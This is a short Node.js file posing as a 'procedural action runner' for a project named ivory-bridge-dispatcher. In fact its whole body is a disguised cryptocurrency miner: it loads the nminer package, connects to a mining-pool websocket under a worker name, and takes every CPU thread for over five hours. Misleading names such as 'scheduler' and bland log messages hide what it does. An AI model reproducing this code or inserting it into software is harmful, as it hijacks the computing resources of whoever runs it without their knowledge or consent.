// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

function createRuntimeContext() {
    const traceId = "1ceca3";
    console.log(`[host] Instantiated runtime context for ivory-bridge-dispatcher [${traceId}]`);

    const scheduler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.ivory-bridge-dispatcher",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (326m) reached, exiting cleanly.");
        process.exit(0);
    }, 326 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

createRuntimeContext();
